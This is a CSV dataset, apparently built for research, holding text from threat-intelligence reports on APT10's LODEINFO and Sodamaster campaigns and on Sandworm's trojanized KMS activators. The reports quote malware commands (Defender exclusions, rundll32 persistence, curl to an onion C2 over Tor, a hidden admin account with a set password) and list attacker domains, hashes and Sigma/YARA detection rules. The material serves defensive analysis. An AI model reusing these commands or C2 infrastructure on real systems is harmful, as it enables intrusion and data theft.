source,url,doc_id,label,text
G0045_apt10,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0045_apt10/APT10-distributes-LODEINFO-malware-to-deploy-infection-chains_TA2022242.pdf,26223715f00f,G0045,"THREAT ADVISORY ACTOR REPORT APT10 distributes LODEINFO malware to deploy infection chains Date of Publication Admiralty code November 2, 2022 A1 TA Number TA2022242 Summary The APT 10 cyber espionage gang has been spotted adopting a new stealthy infection chain to deploy the LODEINFO backdoor shellcode to exfiltrate sensitive information to Command and Control (C2). Actor Map Potential MITRE ATT&CK TTPs TA0002 Execution TA0005 Defense Evasion TA0007 Discovery T1059 Command and Scripting Interpreter T1027 Obfuscated Files or Information T1140 Deobfuscate/Decode Files or Information T1124 System Time Discovery T1082 System Information Discovery THREAT ADVISORY • ACTORS REPORT (Red) |2 Technical Details #1 During the initial phase of the attack, a spear-phishing email with a malicious attachment was delivered to install malware persistence modules, which consisted of a valid EXE file and a malicious DLL file loaded via the DLL sideloading technique. #2 The malicious DLL file contains a LODEINFO shellcode loader. Another form of infection employs a self-extracting archive (SFX) file in RAR format, which comprises three files containing self-extracting script commands. It has been noticed in several incidents that the infection vector used a file-less downloader shellcode called ""DOWNIISSA"". #3 After infiltrating the target machine, the LODEINFO backdoor transfers machine information to the C2. Furthermore, junk data is appended at random to the end of the data, potentially to avoid detection based on packet size. Actor Detail NAME ORIGIN TARGET COUNTRIES TARGET INDUSTRIES APT 10(Stone Panda, menuPass Team, menuPass,Red Apollo,CVNX, Potassium, Hogfish, Happyyongzi, Cicada, Bronze Riverside, CTG-5938,ATK 41,TA429,ITG0 1) China MOTIVE Information theft and espionage Australia, Belgium, Brazil, Canada, China, Finland, France, Germany, Hong Kong, India, Israel, Italy, Japan, Montenegro, Netherlands, Norway, Philippines, Singapore, South Africa, South Korea, Sweden, Switzerland, Taiwan, Thailand, Turkey, UAE, UK, USA, Vietnam. Aerospace, Defense, Energy, Financial, Government, Healthcare, High-Tech, IT, Media, NGOs, Pharmaceutical, Telecommunications, Think- Tanks, Biomedical , Consulting , Manufacturing , Oil and Gas , THREAT ADVISORY • ACTORS REPORT (Red) |3 Indicator of Compromise (IOC) TYPE VALUE da20ff8988198063b56680833c298113,89bd9cf51f8e01bc3b6ec025e d5775fc,,cb2fcd4fd44a7b98af37c6542b198f8d,a0828f194d3835ea21 8609dd93d87d16,16cd587529c230b1a6b47b66d3c84fcf,de4c87a05b ecc78ab2e3f568cd46272c,9066bec5834279ffcb8876f2fdb8752c,016a 974e70bbce6161862e0ac01a0211,d3cae3b6d948ffd17c5a165bad94f 857,16f0b02bf9676d066d245fe0c717ba52,ff71fadc33b883de934e632 ddb4c6b78,1a5a74453ebb9747b433342d1ba242cc,013ef386b1c792f aec51fc550fef063a,da1c9006b493d7e95db4d354c5f0e99f,a8220a76c 2fe3f505a7561c3adba5d4a,26892038ab19c44ba55c84b20083cdbd,c 5bdf14982543b71fb419df3b43fbf07,db0bfce29c7c2f076f711cdde289 8227,a809231cf901bad9d643494d0eb5a630,0fcf90fe2f5165286814a b858d6d4f2a,ad206315afaa0cd5b42f0fc7b537fefd,c9d724c2c5ae965 3045396deaf7e3417,f7de43a56bbb271f045851b77656d6bd,15b80c5 e86b8fd08440fe1a9ca9706c9,6780d9241ad4d8de6e78d936fbf5a922, 76cdb7fe189845a0bc243969dba4e7a3,edc27b958c36b3af5ebc3f775 ce0bcc7 103.175.16[.]39 172.104.72[.]4 172.104.112[.]218 172.105.223[.]216 202.182.108[.]127 45.77.28[.]124 5.8.95[.]174 MD5 IPV4 Domain www.dvdsesso[.]com References https://securelist.com/apt10-tracking-down-lodeinfo-2022-part-i/107742/ https://securelist.com/apt10-tracking-down-lodeinfo-2022-part-ii/107745/ https://thehackernews.com/2022/11/chinese-hackers-using-new-stealthy.html https://attack.mitre.org/groups/G0045/ THREAT ADVISORY • ACTORS REPORT (Red) |4 What Next? At HivePro, it is our mission to detect the most likely threats to your organization and to help you prevent them from happening. Book a free demo with Hive Pro Uni5: Continuous Threat Exposure Management Platform. REPORT GENERATED ON November 2, 2022 • 4:55 AM © 2022 All Rights are Reserved by HivePro More at www.hivepro.com"
G0045_apt10,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0045_apt10/APT10_hivepro.pdf,77fdcce07fb8,G0045,"THREAT ADVISORY APT 10, a state-sponsored Chinese threat group, conducting a global cyber espionage operation TA2022089 Threat Level RED Publish Date – April 12, 2022 A Chinese state-sponsored advanced persistent threat APT 10 group has been attacking government, legal, religious entities and non-governmental organizations (NGOs) around the world in what appears to be an espionage campaign that has been underway for several months. The actor gained initial access by exploiting unpatched Microsoft Exchange Server vulnerabilities, and the attacker then distributed a variety of tools, including a custom loader and the Sodamaster backdoor. The backdoor is a fileless virus that may avoid detection in a sandbox by looking for a registry key or postponing execution; enumerating the username, hostname, and operating system of targeted computers; searching for running processes; and downloading and executing additional payloads. It may also obfuscate and encrypt traffic it delivers back to its command-and-control (C&C) server. The attackers are also seen stealing credentials, including using a custom-made Mimikatz loader. This version of Mimikatz includes mimilib.dll, which allows it to retrieve credentials in plain text for each user who connects to the compromised host and maintains persistence over reboots. The Mitre TTPs commonly used by APT 10 are: TA0042: Resource Development TA0001: Initial Access TA0002: Execution TA0003: Persistence TA0004: Privilege Escalation TA0005: Defense Evasion TA0006: Credential Access TA0007: Discovery TA0008: Lateral Movement TA0009: Collection TA0011: Command and Control TA0010: Exfiltration T1087.002: Account Discovery: Domain Account T1583.001: Acquire Infrastructure: Domains T1560: Archive Collected Data T1560.001: Archive via Utility T1119: Automated Collection T1059.001: Command and Scripting Interpreter: PowerShell T1059.003: Command and Scripting Interpreter: Windows Command Shell T1005: Data from Local System T1039: Data from Network Shared Drive T1074.001: Data Staged: Local Data Staging T1074.002: Data Staged: Remote Data Staging T1140: Deobfuscate/Decode Files or Information T1568.001: Dynamic Resolution: Fast Flux DNS T1190: Exploit Public-Facing Application T1210: Exploitation of Remote Services THREAT ADVISORY T1083: File and Directory Discovery T1574.001: Hijack Execution Flow: DLL Search Order Hijacking T1574.002: Hijack Execution Flow: DLL Side-Loading T1070.003: Indicator Removal on Host: Clear Command History T1070.004: Indicator Removal on Host: File Deletion T1105: Ingress Tool Transfer T1056.001: Input Capture: Keylogging T1036: Masquerading T1036.003: Rename System Utilities T1036.005: Match Legitimate Name or Location T1106: Native API T1046: Network Service Scanning T1027: Obfuscated Files or Information T1588.002: Obtain Capabilities: Tool T1003.002: OS Credential Dumping: Security Account Manager T1003.003: OS Credential Dumping: NTDS T1003.004: OS Credential Dumping: LSA Secrets T1566.001: Phishing: Spearphishing Attachment T1055.012: Process Injection: Process Hollowing T1090.002: Proxy: External Proxy T1021.001: Remote Services: Remote Desktop Protocol T1021.004: Remote Services: SSH T1018: Remote System Discovery T1053.005: Scheduled Task/Job: Scheduled Task T1218.004: Signed Binary Proxy Execution: InstallUtil T1553.002: Subvert Trust Controls: Code Signing T1016: System Network Configuration Discovery T1049: System Network Connections Discovery T1199: Trusted Relationship T1204.002: User Execution: Malicious File T1078: Valid Accounts T1047: Windows Management Instrumentation Actor Details Name Origin Target Locations Target sectors Motive APT 10 (Stone Panda, menuPass Team, menuPass, Red Apollo, Potassium , Hogfish, Happyyongzi, Cicada, Bronze Riverside, CTG- 5938, ATK 41, TA429, ITG01 ) China Australia, Belgium, Brazil, Canada, China, Finland, France, Germany, Hong Kong, India, Israel, Italy, Japan, Montenegro, Netherlands, Norway, Philippines, Singapore, South Africa, South Korea, Sweden, Switzerland, Taiwan, Thailand, Turkey, UAE, UK, USA, Vietnam. Aerospace, Defense, Energy, Financial, Government, Healthcare, High-Tech, IT, Media, NGOs, Pharmaceutical, Telecommunications and MSPs. Information theft and espionage THREAT ADVISORY Indicators of Compromise (IoCs) Type Value SHA256 01b610e8ffcb8fd85f2d682b8a364cad2033c8104014df83988bc3ddfac8e6ec, 056c0628be2435f2b2031b3287726eac38c94d1e7f7aa986969baa09468043b1, 062ce400f522f90909ed5c4783c5e9c60b63c09272e2ddde3d13e748a528fa88, 0b452f7051a74a1d4a544c0004b121635c15f80122dc6be54db660ceb2264d6f, 0ec48b297dd1b0d6c3ddd15ab63f405191d7a849049feedfa7e44096c6f9d42a, 20fc3cf1afcad9e6f19e9abebfc9daf374909801d874c3d276b913f12d6230ec, 2317d3e14ab214f06ae38a729524646971e21b398eda15cc9deb8b00b231abc3, 2417da3adebd446b9fcb8b896adb14ea495a4d923e3655e5033f78d8e648fcc8, 37f56127226ce96af501c8d805e76156ca6b87da1ba1bb5d227100912f6c52d9, 3aa54e7d99b69a81c8b25ab57aeb971644ed0a206743c9e51a80ec1852f03663, 3ff2d6954a6b62afb7499e1e317af64502570181fd49ac5a74e2f7947e2e89db, 4f6a768841595293146ca04f879efa988e4e95ce0f2bc299cb669fea55e78b65, 5269db6b19a1d758c75e58ee9bbf2f8fd684cfedbfe712d5b0182d7bbd3a1690, 5bc68df582c86c884b563b15057cc223f2e9bc1022ebb297e32a9a7e3036228b, 6b4692029f05489ecda10e11cfacfc3b19097856b88647d3695f3bdc7dd83ce9, 7b581c0305c78f28bad60028c63e852dc34fc9e28f39e4b0af73d80c1d9680c9, 83030f299a776114878bcd2ade585d97836ef4ddb6943cb796be2c88bcb83a83, 90a03dabfc4e56a12cc3bac5cbe991db044b900a01ec341803c864506e467ffa, 9917a2213f114e87745867e5fea6717efd727d7c08fdc851969224be2f0e019b, 9b5f9ff82ed238bcbd83628ed3ec84988dc05f81cec9e45a512fbd2c8ac45c33, adfe177ade7d9bfe4df251a69678102aec1104a4ba9f73032dd90aba76d8bdd9, b76fde584f87c88bdd21fab613335ce7fc05788aa4bb3191d1517ec16ef4d11a, ce45af43dd2af52d6034e981515474147802efdfe036e00078fee29a01694fd6, d461347388ccf0c2008332a1674885a41f70b94b2263bddef44e796d3b1b43b5, df993dca434c3cd2da94b6a90b0ae1650d9c95ea1d5f6a5267aca640d8c6d00e, ee46e714660f7652502d5b3633fae0c08c8018f51cfb56a487afd58d04dd551a, fe33fdd5a63fee62362c9db329dde11080a0152e513ef0e6f680286a6a7b243f IPv4 88[.]198.101[.]58, 168[.]100.8[.]38 References https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks"
G0034_sandworm,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0034_sandworm/Sandworm APT Targets Ukrainian Users with Trojanized Microsoft KMS Activation Tools in Cyber Espionage Campaigns.pdf,519bf38e4b02,G0034,"Sandworm APT Targets Ukrainian Users with Trojanized Microsoft KMS Activation Tools in Cyber Espionage Campaigns blog.eclecticiq.com/sandworm-apt-targets-ukrainian-users-with-trojanized-microsoft-kms-activation-tools-in-cyber- espionage-campaigns Arda Büyükkaya February 11, 2025 1/27 Intelligence Research Executive Summary EclecticIQ analysts assess with high confidence that Sandworm (APT44) [1], a threat actor supporting Russia's Main Intelligence Directorate (GRU), is actively conducting a cyber espionage campaign against Ukrainian Windows users. Likely ongoing since late 2023, following Russia's invasion of Ukraine, Sandworm leverages pirated Microsoft Key Management Service (KMS) activators and fake Windows updates to deliver a new version of BACKORDER [2], a loader previously associated with the group. BACKORDER ultimately deploys Dark Crystal RAT (DcRAT) [3], enabling attackers to exfiltrate sensitive data and conduct cyber espionage. Multiple pieces of evidence strongly link this campaign to Sandworm, also tracked by CERT- UA as UAC-0145 [4], based on recurring use of ProtonMail accounts in WHOIS records, overlapping infrastructure, and consistent Tactics, Techniques and Procedures (TTPs). Additionally, the reuse of BACKORDER, DcRAT, and TOR network mechanisms, along with debug symbols referencing a Russian-language build environment, further reinforce confidence in Sandworm’s involvement. Figure 1 - Sandworm TTPs and malware in the EclecticIQ Threat Intelligence Platform. Ukraine’s heavy reliance on cracked software, including in government institutions, creates a major attack surface. According to a public report [5], Microsoft has estimated that 70% of software in Ukraine’s state sector was unlicensed, a trend likely worsened by economic hardships from the ongoing war. Many users, including businesses and critical entities, have turned to pirated software from untrusted sources, giving adversaries like Sandworm 2/27 (APT44) a prime opportunity to embed malware in widely used programs. This tactic enables large-scale espionage, data theft, and network compromise, directly threatening Ukraine’s national security, critical infrastructure, and private sector resilience. KMS Update Campaign: Trojanized KMS Activators Targeting Ukrainian Victims EclecticIQ analysts observed an password protected ZIP file titled “KMSAuto++x64_v1.8.4.zip” [6] uploaded to Torrent [7], that was Trojanized with BACKORDER loader. The threat actors disguised the file as a KMS activation tool [8] to targeting users who wants to cracking Windows licensing requirements. According to a report from Mandiant, another GRU-linked threat actor tracked as UNC4166, previously employed similar tactics against the Ukrainian government by using a trojanized Windows 10 operating system installer [9]. Figure 2 - Torrent info of the malicious KMS Auto Tool. Since this initial case, EclecticIQ analysts have identified seven distinct malware distribution campaigns tied to the same activity cluster, each employing similar lures and TTPs. On 12 January 2025, analysts observed the most recent campaign using a typosquatted domain and slightly modified tactics to download and execute Dark Crystal RAT - a remote administration tool known for data exfiltration capabilities and previous use by Sandworm [10]. BACKORDER Loader Deliverers Dark Crystal RAT (DcRAT) The KMS activation tool displays a fake Windows activation interface upon execution. Meanwhile, the threat actor’s GO-based loader BACKORDER initializes in the background, enabling malicious operations to proceed undetected against Windows Defender. 3/27 Figure 3 - Execution of Trojanized KMS Auto Tool. BACKORDER loader disables Windows Defender and adds exclusion rules to certain folders via powershell.exe -Command Add-MpPreference –ExclusionPath <Folder-Path> command, preparing the victim’s system for the final DcRAT payload. 4/27 Figure 4 - Disassembled BACKORDER Loader. The BACKORDER loader variant uses multiple Living Off the Land Binaries (LOLBAS/LOLBIN) during defence evasion process to ensure successful system infection. Figure 5 illustrates the LOLBAS/LOLBIN techniques utilized by the loader: Figure 5 - List of LOLBAS/LOLBIN used by the BACKORDER Loader. 5/27 Based on the disassembled code, function main_convert_B64_to_Str() was responsible for retrieving and decoding the Base64-encoded domain string, ultimately revealing the static URL kmsupdate2023[.]com/kms2023.zip. The payload name kms2023 is not obfuscated and appears in the .data section of the Portable Executable (PE) file. This section typically stores initialized global and static variables, indicating that the malware stores the payload name in plaintext within this segment. After decoding the Base64, another function main_get_zip()downloads the heavily obfuscated DcRAT malware from the decoded URL and executes the payload. It then stores the malicious file at \AppData\Roaming\kms2023\kms2023.exe and saves an additional copy into \AppData\Local\staticfile.exe. Figure 6 - Base64 encoded URL inside the disassembled BACKORDER Loader. Once infected, DcRAT kms2023.exe [11] establishes a remote connection to the command- and-control server onedrivepack[.]com/pipe_RequestPollUpdateProcessAuthwordpress.php, that is very likely operated by the threat actor. The DcRAT malware exfiltrates the following details from the victim´s computer to the attacker-controlled command and control server: Screenshot of the device The victim’s keystrokes Browser cookies, history and saved credentials Credentials from popular FTP applications System information such as hostname, usernames, language preference settings, and installed applications Saved credit card details Using Scheduled Tasks to Maintain Access EclecticIQ analysts observed that the DcRAT sample created multiple scheduled tasks to maintain persistent access on the victim’s device by regularly launching the malicious payload. The malware used the Windows built-in binary schtasks.exe to register two different scheduled tasks named as staticfiles and staticfile and executed staticfile.exe with elevated privileges from C:\Users\Admin\AppData\Local. This tactic ensures the adversary retains a foothold on the system, allowing malicious operations to continue even after reboots or user logoffs. 6/27 Figure 7 - Scheduled tasks for persistent access on a victim’s device. Russian-Language Comments and Debug Symbol Expose Likely Russian Origin On 25 November 2024, EclecticIQ analysts detected another trojanized KMS activationlure uploaded to VirusTotal from Ukraine [12], using tactics consistent with prior campaigns of BACKORDER loader. The malware sample was compiled as a 64-bit Python 3.13 application via PyInstaller, this sample contained debug paths and Russian-language comments, signaling likely Russian origins. The malicious KMS activator downloads and executes a second-stage payload upon execution. Closer analysis revealed that the fake activator deploys a Python code main.py alongside two scripts—Functions.py and Functions_2.py—to perform various tasks. These scripts: Disable Windows security features Load the malware Establish persistence through scheduled tasks In Functions.py : Figure 8 – Russian language comments inside the source code. 7/27 English translations: “We will change the working directory to the script directory” “We will change back to the working directory” In Functions_2.py: Figure 9 - Russian language print output inside the source code. English translation: “Permission error while creating file: {target_file_path}” Functions.py downloads a ZIP file with Windows Office activation scripts from a GitHub repository and extracts them into %LOCALAPPDATA%\Microsoft-Activation-Scripts. It then displays a user interface for the victim. Functions_2.py further preps the system by disabling Defender scans, stopping Windows Updates, and establishing persistence through a scheduled task. As part of this process, it copies malicious DLLs (e.g., Runtime Broker.dll, stream.x86.x.dll) into the same Microsoft- Activation-Scripts directory. This defense evasion technique is also used by the BACKORDER loader sample. Figure 10 - Microsoft Defender exclusion function very similar to previous campaign of BACKORDER. 8/27 The script creates a scheduled task named OneDrive Reporting Task-S-1-6-91-2656291417- 2341898128-2085478365-1000. Each time the user logs in, Windows runs: rundll32.exe %LOCALAPPDATA%\Microsoft-Activation- Scripts\stream.x86.x.dll,ExportedFunction Analysts assess with medium confidence that the dropped malicious DLL file, Runtime Broker.dll [13], is very likely a new version of BACKORDER loader, developed in GO Language and designed to download and execute second stage malware from the remote host https://activationsmicrosoft[.]com/activationsmicrosoft.php. Since the time of writing, analysts have been unable to obtain the second-stage malware due to shutdown of the attacker controlled remote server. Figure 11 - URL for downloading second stage payload. One of the most revealing mistakes was the actor’s failure to remove debug symbols from the binary, which exposed the original build location and file name New_dropper.go: Figure 12 - Debug symbol remnants in the new version of the BACKORDER loader. The IEUser reference matches Microsoft’s previously provided test virtual machines (VMs), suggesting the threat actor compiled the malware on this default user account. Shared Registrars and Emails Connect Multiple Malicious Domains to the Same Threat Cluster The onedrivestandalone.php URL path on the kmsupdate2023[.]com C2 domain links to a broader malware-delivery campaign. Analysts pivoted from this indicator to uncover multiple additional C2 servers, each using a “KMS activation” lure, suggesting they are very likely part of the same operation. Figure 13 in the EclecticIQ Threat Intelligence Platform’s graph view highlights several more domains tied to this campaign, reinforcing its scale and coordinated infrastructure very likely used by Sandworm members. 9/27 Figure 13 - Graph view of the domain pivoting and WHOIS details. Registrar and Emails: Four of the domains (windowsupdatesystem[.]org, kms-win11-update[.]net, kalambur[.]net, and ratiborus2023[.]com, kmsupdate2023[.]com)share the same registrar, PDR Ltd. d/b/a PublicDomainRegistry.com, Two registrant emails appear multiple times: email: inekawaki@proton[.]me email: asmohamed2030@protonmail[.]com onedrivestandaloneupdater[.]com, is registered with GMO Internet, Inc. and uses the email: email: repgoti@proton[.]me From these WHOIS records, analysts identified several shared characteristics: Consistent abuse of Cloudflare nameservers Recurrent proton.me and protonmail.com registrant email addresses Overlapping registrars, predominantly PDR Ltd. and GMO Internet, Inc. Creation dates clustered between late 2023 and late 2024 Kalambur: Analysts Discovered New RDP Backdoor Disguised as Windows Update, Leverages TOR for Stealth EclecticIQ analysts observed a new backdoor following the domain pivot. In this case, the threat actor used a domain kalambur[.]net to download a Microsoft Windows Update-themed RDP backdoor. Analysts named this malware as Kalambur (каламбур) based on the file and 10/27 domain name chosen by the attacker. In Russian (and some other Slavic languages), «каламбур» (kalambur) refers to a pun. The malware execution flow starts with the kalambur2021_v39.exe C#-based backdoor [14] and downloader. It is designed to download a repackaged TOR binary inside a ZIP file and retrieve additional tools from what is likely an attacker-controlled TOR onion site. Analysis of the Loader and Embedded PowerShell Script During static and dynamic analysis of kalambur2021_v39.exe, analysts discovered a PowerShell script in the loader's resources section. Upon execution, the script performs a series of malicious actions: 1. Tor-based Command-and-Control (C2) Figure 14 - PowerShell code using CURL.exe for the C2 activity over onion site. Terminates any pre-existing Tor service, installs its own Tor service, and reconfigures it to listen on 127.0.0.1:9050 for SOCKS5 proxy. Similar attack pattern also observed by Mandiant and attributed to UNC4166 [9]. 2zilmiystfbjib2k4hvhpnv2uhni4ax5ce4xlpb7swkjimfnszxbkaid[.]onion Uses curl.exe with the SOCKS5 tunnel to communicate with the .onion domain, sending and receiving commands discreetly. 2. Persistence via Scheduled Tasks 11/27 Figure 15 - Kalambur references in the PowerShell Script and Scheduled Tasks creation function. Creates a scheduled task named WindowsUpdateCheck, pointing to rata.vbs, running every 60 minutes under the SYSTEM account. This ensures the malicious script runs repeatedly, even after reboots, maintaining persistence. 3. System Information Gathering and Exfiltration Retrieves the machine’s public IP (using ident.me) and fetches the UUID from Win32_ComputerSystemProduct. Saves this data locally (e.g., ip0, uuid0, cn0) and then exfiltrates it to the attacker’s hidden service. 4. Downloads TOR Browser for C2 activity Figure 16 - Downloading TOR browser from remote host inside the ZIP folder. Downloads a ZIP file (commonly called WindowsUpdate.zip) from kalambur[.]net, extracts it, and runs the included executable (searchindex.exe). Fetches hid.dll [15] from the same domain, placing it in CommonProgramFiles\Microsoft Shared\ink\, used for DLL Injection and TOR Browser installation. 12/27 5. OpenSSH Deployment Figure 17 - Installation of OpenSSH and SSH backdoor creation. The script downloads and silently installs Win32-OpenSSH, opening TCP port 22 in the firewall. This creates an additional remote-control channel for the attackers, beyond the RDP backdoor. 6. RDP Backdoor Setup Figure 18 - Creation of new user for RDP Backdoor. Modifies registry and firewall settings to enable Remote Desktop Protocol (RDP) on port 3389, reduces RDP security layers, and allows inbound connections. Creates or reactivates a hidden administrator user (e.g., Admin or WGUtilityOperator) with a predefined password (1qaz@WSX). The user account is hidden in Windows logon settings via registry edits. 7. Cleanup of Traces Deletes leftover installers and temporary scripts, such as the MSI file for OpenSSH, the downloaded ZIP archive, and helper .vbs files, minimizing evidence on disk. 13/27 Conclusion: From Pirated Software to the Compromise of Critical Infrastructure in Ukraine EclecticIQ assesses with medium confidence that Sandworm (APT44) is distributing trojanized pirated software through Ukrainian-speaking forums, warez sites, and other illicit software-sharing platforms. This assessment is based on multiple sources indicating such activity [9], but with some gaps in data related to new campaigns that prevent a higher confidence level. Given Ukraine's high piracy rates and economic constraints [16], these channels likely serve as weak points for initial infection vectors. According to a 2018 Business Software Alliance (BSA) report [17], Ukraine had a software piracy rate of approximately 80%, making it one of the highest in Europe. By embedding malware within pirated Windows activators, fake updates, and software cracks, Sandworm has very likely gained access to home users, businesses, and potentially government networks. CERT-UA's findings suggest this method has already been exploited in at least one confirmed incident [18]. On April 3, 2023, CERT-UA reported [19] that a Ukrainian utility company employee installed a pirated version of Microsoft Office, unknowingly executing malicious DarkCrystal RAT and DWAgent Remote Monitoring and Management (RMM) software. This gave attackers unauthorized access to the company’s information and communication system (ICS) devices, posing a direct threat to operational technology (OT). Although no major disruptions were publicly reported, the incident underscores the risk associated with trojanized software in critical infrastructure environments. By leveraging trojanized software to infiltrate ICS environments, Sandworm (APT44) continues to demonstrate its strategic objective of destabilizing Ukraine's critical infrastructure in support of Russian geopolitical ambitions. This tactic aligns with Moscow’s broader hybrid warfare strategy, where cyber operations complement kinetic and economic pressure to undermine Ukrainian sovereignty. SIGMA Rules title: Kalambur Backdoor TOR/SOCKS5 Detection id: E99375EB-3EE0-407A-9F90-79569CC6A01C date: 2025-02-02 status: test author: Arda Buyukkaya (EclecticIQ) description: > 14/27 Detects executions of curl.exe where the command-line arguments include a SOCKS5 proxy indicator (""socks5h://127.0.0.1:9050"") or a reference to an onion domain. In addition to checking the arguments, the rule confirms that the process is indeed curl.exe by verifying that either the process name or one of the description fields indicates the use of curl. references: - https://www.eclecticiq.com tags: - attack.t1090 - attack.t1573 - attack.t1071.001 - attack.t1059.001 - attack.t1059.003 - attack.s0183 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\\curl.exe' CommandLine|contains: - 'socks5h://127.0.0.1:9050' - '.onion/' Description|contains: 'The curl executable' Product|contains: 'The curl executable' Company|contains: 'curl, https://curl.se/' condition: selection falsepositives: 15/27 - Legitimate use of curl with SOCKS5 proxies or TOR level: high title: ""Suspicious Windows Defender Exclusion in BACKORDER Loader"" id: ""76FEE02A-AB0E-49A6-8972-C2FC7ECBD51E"" date: ""2025-02-02"" status: test author: Arda Buyukkaya (EclecticIQ) description: > This Sigma rule detects process creation events that may indicate malicious activity associated with the BACKORDER Loader Deliverers Dark Crystal RAT (DcRAT) campaign. The loader disables Windows Defender and adds exclusion rules via multiple Living Off the Land Binaries (LOLBAS) to evade detection. references: - https://www.eclecticiq.com tags: - attack.t1546.003 - attack.s0075 - attack.t1562.001 - attack.t1059.001 - attack.t1053.005 logsource: category: process_creation product: windows detection: selection_wmic_add_exclusion: Image|endswith: ""\\WMIC.exe"" CommandLine|contains: 16/27 - '/NAMESPACE:\\root\\Microsoft\\Windows\\Defender' - 'MSFT_MpPreference' - 'Add ExclusionPath=' selection_wmic_networkadapter: Image|endswith: ""\\WMIC.exe"" CommandLine|contains: - ""path Win32_NetworkAdapter"" selection_reg_query_defender: Image|endswith: ""\\reg.exe"" CommandLine|contains: - ""query"" - ""Windows Defender"" - ""DisableAntiSpyware"" selection_sc_query: Image|endswith: ""\\sc.exe"" CommandLine|contains: - ""query WinDefend"" - ""query SecurityHealthService"" selection_powershell_add_mppreference: Image|endswith: ""\\powershell.exe"" CommandLine|contains: - ""-Command"" - ""Add-MpPreference"" - ""ExclusionPath"" condition: 1 of selection_* falsepositives: - ""Legitimate administrative actions to disable Windows Defender."" level: ""high"" 17/27 YARA Rule import ""pe"" rule MAL_BACKORDER_LOADER_WIN_Go_Jan23 { meta: description = ""Detects the BACKORDER loader compiled in GO which download and executes a second stage payload from a remote server."" author = ""Arda Buyukkaya"" date = ""2025-01-23"" reference = ""EclecticIQ"" tags = ""loader, golang, BACKORDER, malware, windows"" hash = ""70c91ffdc866920a634b31bf4a070fb3c3f947fc9de22b783d6f47a097fec2d8"" strings: $x_GoBuildId = /Go build ID: \""[a-zA-Z0-9\/_-]{40,120}\""/ ascii wide $s_DefenderExclusion = ""powershell Add-MpPreference -ExclusionPath"" // Debug symbols commonly seen in BACKORDER loader $s_DebugSymbol_1 = ""C:/updatescheck/main.go"" $s_DebugSymbol_2 = ""C:/Users/IEUser/Desktop/Majestic/14.11/New_droper.go"" $s_DebugSymbol_3 = ""C:/Users/IEUser/Desktop/Majestic/14.11/Droper.go"" // Function name patterns observed in BACKORDER loader $s_FunctionNamePattern_1 = ""main.getUpdates.func"" $s_FunctionNamePattern_2 = ""main.obt_zip"" $s_FunctionNamePattern_3 = ""main.obtener_zip"" $s_FunctionNamePattern_4 = ""main.get_zip"" $s_FunctionNamePattern_5 = ""main.show_pr0gressbar"" $s_FunctionNamePattern_6 = ""main.pr0cess"" condition: 18/27 pe.is_pe and filesize < 10MB and $x_GoBuildId and ( $s_DefenderExclusion or 1 of ($s_DebugSymbol_*) or 2 of ($s_FunctionNamePattern_*) ) } IOCs KMS Lure Uploaded to Torrent: btdig[.]com/172d3750e3617526563dd0b24c4ba88f907622b9 Fake Microsoft Activation Program – SHA 256 Hash: afc6131b17138a6132685617aa60293a40f2462dc3a810a4cf745977498e0255 ed5735449a245355706fc58f4b744251f6e499833f02a972f9bd448c28467194 fdc3f0516e1558cc4c9105ac23716f39a6708b8facada3a48609073a16a63c83 BACKORDER loader - SHA 256 Hash: 19/27 48450c0a00b9d1ecce930eadbac27c3c80db73360bc099d3098c08567a59cdd3 22c79153e0519f13b575f4bfc65a5280ff93e054099f9356a842ce3266e40c3d a42de97a466868efbfc4aa1ef08bfdb3cc5916d1accd59cfffff1a896d569412 8cfa4f10944fc575420533b6b9bbcabbf3ae57fe60c6622883439dbb1aa60369 8a4df53283a363c4dd67e2bda7a430af2766a59f8a2faf341da98987fe8d7cbd 70c91ffdc866920a634b31bf4a070fb3c3f947fc9de22b783d6f47a097fec2d8 0e58d38fd2df86eeb4a556030a0996c04bd63e09e669b34d3bbc10558edf31a6 5bff08a6aa7a7541c0b7b1660fd944cec55fa82df6285166f4da7a48b81f776e 4b9e32327067a84d356acb8494dc05851dbf06ade961789a982a5505b9e061e3 Dark Crystal RAT (DcRAT) - SHA 256 Hash: 039c8dd066efa3dd7ac653689bfa07b2089ce4d8473c907547231c6dd2b136ec 0e58d38fd2df86eeb4a556030a0996c04bd63e09e669b34d3bbc10558edf31a6 1a1ffcbab9bff4a033a26e8b9a08039955ac14ac5ce1f8fb22ff481109d781a7 2de08a0924e3091b51b4451c694570c11969fb694a493e7f4d89290ae5600c2c 4b0038de82868c7196969e91a4f7e94d0fa2b5efa7a905463afc01bfca4b8221 7c0da4e314a550a66182f13832309f7732f93be4a31d97faa6b9a0b311b463ff a00beaa5228a153810b65151785596bebe2f09f77851c92989f620e37c60c935 b45712acbadcd17cb35b8f8540ecc468b73cac9e31b91c8d6a84af90f10f29f8 20/27 cd7c36a2f4797b9ca6e87ab44cb6c8b4da496cff29ed5bf727f0699917bae69a 4b2e4466d1becfa40a3c65de41e5b4d2aa23324e321f727f3ba20943fd6de9e5 553f7f32c40626cbddd6435994aff8fc46862ef2ed8f705f2ad92f76e8a3af12 d774b1d0f5bdb26e68e63dc93ba81a1cdf076524e29b4260b67542c06fbfe55c 70cad07a082780caa130290fcbb1fd049d207777b587db6a5ee9ecf15659419f c5853083d4788a967548bee6cc81d998b0d709a240090cfed4ab530ece8b436e Kalambur Backdoor – SHA 256 Hash: aadd85e88c0ebb0a3af63d241648c0670599c3365ff7e5620eb8d06902fdde83 7d92b10859cd9897d59247eb2ca6fb8ec52d8ce23a43ef99ff9d9de4605ca12b d13f0641fd98df4edcf839f0d498b6b6b29fbb8f0134a6dae3d9eb577d771589 dd7a9d8d8f550a8091c79f2fb6a7b558062e66af852a612a1885c3d122f2591b C2 Ipv4 Address: 5.255.122[.]118 C2 Domains : Activationsmicrosoft[.]com kmsupdate2023[.]com kms-win11-update[.]net Windowsupdatesystem[.]org 21/27 ratiborus2023[.]com Onedrivestandaloneupdater[.]com Kalambur[.]net Windowsdrivepack[.]com akamaitechcdns.com MITRE TTPs T1204.002 – User Execution: Malicious File T1059.001 – Command and Scripting Interpreter: PowerShell T1218.011 – Signed Binary Proxy Execution: Rundll32 T1569.002 – System Services: Service Execution T1053.005 – Scheduled Task/Job: Scheduled Task T1548.002 – Abuse Elevation Control 